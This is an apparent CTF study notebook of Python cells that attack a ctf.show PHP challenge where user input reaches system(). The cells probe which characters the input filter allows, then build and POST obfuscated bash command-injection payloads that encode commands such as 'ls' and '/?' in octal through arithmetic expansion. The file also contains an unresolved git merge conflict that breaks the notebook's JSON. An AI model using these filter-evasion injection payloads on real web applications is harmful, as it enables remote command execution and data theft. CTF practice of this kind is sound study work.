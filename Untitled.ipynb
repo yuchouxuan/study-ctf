{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5a694021",
   "metadata": {},
   "outputs": [],
   "source": [
<<<<<<< HEAD
    "url='http://decee169-ca0f-488e-a1a9-6e1da64c3431.challenge.ctf.show/'\n",
    "import requests\n",
    "for i in range(1,128):\n",
    "    c = chr(i)\n",
    "    # print(c,end=' ')\n",
    "    x = requests.post(url,data={'ctf_show':f'{c}'}).text \n",
    "    if '??????' not in x :\n",
    "        print(c ,end = ' ')\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b\"$\\\\'\\\\\\\\$(($((1<<1))#10011010))\\\\'$\\\\'\\\\\\\\$(($((1<<1))#1110011))\\\\'\"\n",
      "<code><span style=\"color: #000000\">\n",
      "<span style=\"color: #0000BB\">&lt;?php<br /></span><span style=\"color: #FF8000\">//本题灵感来自研究一直没做出来的某赛某题时想到的姿势，太棒啦~。<br />//flag在根目录flag里<br /><br /></span><span style=\"color: #0000BB\">error_reporting</span><span style=\"color: #007700\">(</span><span style=\"color: #0000BB\">0</span><span style=\"color: #007700\">);<br /></span><span style=\"color: #0000BB\">highlight_file</span><span style=\"color: #007700\">(</span><span style=\"color: #0000BB\">__FILE__</span><span style=\"color: #007700\">);<br />include&nbsp;</span><span style=\"color: #DD0000\">\"check.php\"</span><span style=\"color: #007700\">;<br /><br />if&nbsp;(isset(</span><span style=\"color: #0000BB\">$_POST</span><span style=\"color: #007700\">[</span><span style=\"color: #DD0000\">'ctf_show'</span><span style=\"color: #007700\">]))&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"color: #0000BB\">$ctfshow&nbsp;</span><span style=\"color: #007700\">=&nbsp;</span><span style=\"color: #0000BB\">$_POST</span><span style=\"color: #007700\">[</span><span style=\"color: #DD0000\">'ctf_show'</span><span style=\"color: #007700\">];<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"color: #0000BB\">check</span><span style=\"color: #007700\">(</span><span style=\"color: #0000BB\">$ctfshow</span><span style=\"color: #007700\">);<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"color: #0000BB\">system</span><span style=\"color: #007700\">(</span><span style=\"color: #0000BB\">$ctfshow</span><span style=\"color: #007700\">);<br />}<br /></span><span style=\"color: #0000BB\">?&gt;</span>\n",
      "</span>\n",
      "</code>\n"
     ]
    },
    {
     "ename": "",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001B[1;31mThe Kernel crashed while executing code in the the current cell or a previous cell. Please review the code in the cell(s) to identify a possible cause of the failure. Click <a href='https://aka.ms/vscodeJupyterKernelCrash'>here</a> for more info. View Jupyter <a href='command:jupyter.viewOutput'>log</a> for further details."
     ]
    }
   ],
   "source": [
    "pl = rb'''$\\'\\\\$(($((1<<1))#10011010))\\'$\\'\\\\$(($((1<<1))#1110011))\\''''\n",
    "print(pl)\n",
    "print(requests.post(url,data={'ctf_show':pl}).text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "3b6d64c9",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\\57\\77\\"
     ]
    }
   ],
   "source": [
    "cmd = b'/?'\n",
    "print('\\\\',end='')\n",
    "for i in cmd: \n",
    "    print(oct(i)[2:],end='\\\\') "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "01879ec3",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0b10011010\n",
      "0b10100011\n"
     ]
    }
   ],
   "source": [
    "for i in b'ls':\n",
    "    o = oct(i)[2:] \n",
    "    print(bin(int(o)))"
=======
    "!dir"
>>>>>>> ae4c5bc2bce3533057310b4995d02ee74fc8ecb1
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
